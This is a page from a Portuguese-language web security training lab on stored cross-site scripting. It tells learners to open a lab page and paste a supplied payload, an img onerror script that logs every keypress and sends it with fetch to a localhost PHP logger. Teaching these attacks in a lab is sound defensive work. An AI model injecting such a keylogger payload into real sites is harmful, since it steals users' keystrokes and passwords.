<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/menu.css" rel="stylesheet">
    <link href="../css/fonts.css" rel="stylesheet">
    <link href="../css/tutorial_before_lab.css" rel="stylesheet">
    <link href="../css/general_config.css" rel="stylesheet">
    <link href="../css/tutorials_box.css" rel="stylesheet">
    <link href="../css/copy_button.css" rel="stylesheet">

    <script src="../js/jquery.js"></script>
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/bootstrap.js"></script>
    <script src="../js/popper.min.js"></script>
    <script src="../js/bootstrap.bundle.min.js"></script>
    <script src="../js/bootstrap.bundle.js"></script>
    <script src="../js/bootstrap.min4.5.js"></script>

    <title>Tutorial XSS Armazenado</title>
</head>

<style>

.image-container {
    margin-left: auto;
    margin-right: auto;
    margin-top: 10vw;
    align-self: center;
}

.robot-speech {
    width: 350px;
    margin-left: auto;
    margin-right: auto;
    z-index: 10;
    transform: translateX(-100px);
}
.writer{
    padding-left:10px;
}
.robot-speech::after{
  top: 5px; 
  right: -20px; 
  transform: rotate(100deg); 
}

.container-robot {
    padding: 0;
    z-index: 10;
    height: 10vw;
    align-self: center;
}

.container-buttons{
    margin-top: 7vw;
}

.container{
        text-align: center;
    }
.robot{
    margin-left: -50px;
    margin-top: 20px;
    transform: translate(-60px, 0px);
}
.code{
    text-align:left;
    margin-top: 95px;
    margin-bottom: 50px;
}
.green-button {
    background-color: #00D600;
    color: white;
    border: none;
    border-radius: 30px;
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
    text-decoration: none;
    font-family: 'Jost', sans-serif;
    display: inline-block
}

.green-button:hover {
    background-color: #00B800;
}
</style>

<body>
    
<div style="display: flex; width: 100%;">
    
    <?php include '../menu_lateral_avanc.php'; ?>
    <div class="content">
    <div class ="container-robot">
        <div class="robot-speech ">
            <p class="writer" id="balloon-text">
            Agora, em nosso laboratório, explore o ataque visto. Não se esqueça de clicar no botão para abrir a página index99.html e copie o payload abaixo para ver os resultados do ataque de Keylogger.
            </p>
        </div>
        <div class="robot d-inline-flex align-items-center justify-content-center">
        <img src="../img/robot.png" alt="robot-icon" width="200px" height="200px">
        </div>
  </div>
    <div class="central-text" style="text-align: justify; padding-top: 40px; padding-left: 90px; padding-right: 90px;">
    <p >Clique no botão e acesse a página index99.html:
        <a href="../index99.html" target="_blank" class="green-button">Ir para index99.html</a>
    </p>
    <p>
    Lembre-se dos tratamento aprendidos:
    </p>
    
    <div class="code" style="margin-top: 20px">
        <div id="codeBlock">
        <code>


        &lt;img src=x onerror=document.onkeypress=function(e){fetch("http://localhost/log6.php?k="+String.fromCharCode(e.which))},this.remove();&gt;    
        </code>
        </div>
        <button class="copyButton" id="copyButton">Copiar Código</button>
        <button class="copyButton copied" id="copied">Copiado <img src="../img/check.png" alt="" width=20px;></button>
        </div>
</div>
        <div class="container-buttons" style="margin-top: 5vh;">
            <a href="./lab1-armazenado4.php" draggable = "false" style="color: white; text-decoration: none;">
                <div class="btn btn-primary transition-button" id="transition-back">
                    &lt;&lt;Retornar 
                </div>
            </a> 
            <button class="btn btn-primary transition-button" id="transition-next" style="color: white; text-decoration: none;" onclick="finishTask(taskNo, redirPath)">
                    Laboratório&gt;&gt;
            </button>
        </div>
        </div>
    </div>
</div>

<script>
var taskNo = 22;
var redirPath = "../laboratorio/checkout.php?atividade=keylogger";
let caso = 'EI';
</script>
<script src="../js/progress.js"></script>
<script src ="../js/robotUpdate.js"></script>
<script src="../js/writerTutorial.js"></script>
<script src="../js/menuLateral.js"></script>
<script src="../js/robotAdjustment.js"></script>
<script src="../js/copy_button.js"></script>
<script>
positionRobotForMenuState();
</script>
</body>
</html>

